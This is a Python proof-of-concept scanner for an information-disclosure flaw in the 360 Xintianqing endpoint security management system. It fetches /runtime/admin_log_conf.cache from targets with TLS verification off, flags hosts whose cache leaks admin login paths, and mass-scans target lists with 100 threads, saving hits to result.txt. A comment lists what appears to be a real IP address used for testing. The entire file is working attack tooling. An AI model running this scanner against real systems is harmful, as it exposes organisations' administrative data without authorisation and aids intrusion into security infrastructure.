import requests, re, argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
# 测试https://125.64.225.138:8443


def banner():
    test = """
                                                   ______
    ______________________________________________ ___  /
    ___  __ \  _ \_  ___/_  ___/  __ \_  __ \  __ `/_  / 
    __  /_/ /  __/  /   _(__  )/ /_/ /  / / / /_/ /_  /  
    _  .___/\___//_/    /____/ \____//_/ /_/\__,_/ /_/   
    /_/                                                  
                                       author:NaA100
                                       date:2024-09-3
                                       version:1.0                    
    """
    print(test)


def poc(target):
    headers = {
        'User-Agent': 'Mozilla/5.0 (windows NT 10.0; Win64; x64;rv:128.0) Gecko/20100101 Firefox/128.0'
    }
    payload = '/runtime/admin_log_conf.cache'
    try:
        res1 = requests.get(url=target + payload, headers=headers, verify=False, timeout=10)
        content = re.findall(r's:12:"(.*?)";', res1.text)
        if '/login/login' in content:
            print(f"[+]{target}存在信息泄露")
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(f"{target}\n")
        elif res1.status_code != 200:
            print(f"[+]{target}网站未响应，请手工测试")
        else:
            print(f"[-]{target}不存在漏洞")
    except Exception as e:
        print(e)


def main():
    banner()
    url_list = []
    parse = argparse.ArgumentParser(description="360 新天擎终端安全管理系统信息泄露漏洞")

    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")

    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                url_list.append(url.replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"您的输入有误，请使用python file_name.py -h for help")


if __name__ == '__main__':
    main()
